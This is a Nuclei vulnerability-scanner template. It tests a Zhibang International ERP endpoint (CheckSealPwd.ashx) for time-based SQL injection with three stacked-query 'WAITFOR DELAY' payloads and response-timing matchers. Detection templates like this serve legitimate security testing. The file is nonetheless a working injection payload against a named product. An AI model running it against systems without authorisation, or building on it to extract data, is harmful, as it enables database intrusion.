
id: zhibangERP-CheckSealPwd-sqli
info:
  name: 智邦国际-CheckSealPwd-SQL注入漏洞
  author: apple
  severity: high
  description: 智邦国际-CheckSealPwd-SQL注入漏洞
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        GET /SYSN/json/pcclient/CheckSealPwd.ashx?pwd=1&id=1;WAITFOR%20DELAY%20%270:0:3%27-- HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: zh-CN,zh;q=0.9
      - |-
        GET /SYSN/json/pcclient/CheckSealPwd.ashx?pwd=1&id=1;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: zh-CN,zh;q=0.9
      - |-
        GET /SYSN/json/pcclient/CheckSealPwd.ashx?pwd=1&id=1;WAITFOR%20DELAY%20%270:0:9%27-- HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: zh-CN,zh;q=0.9
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"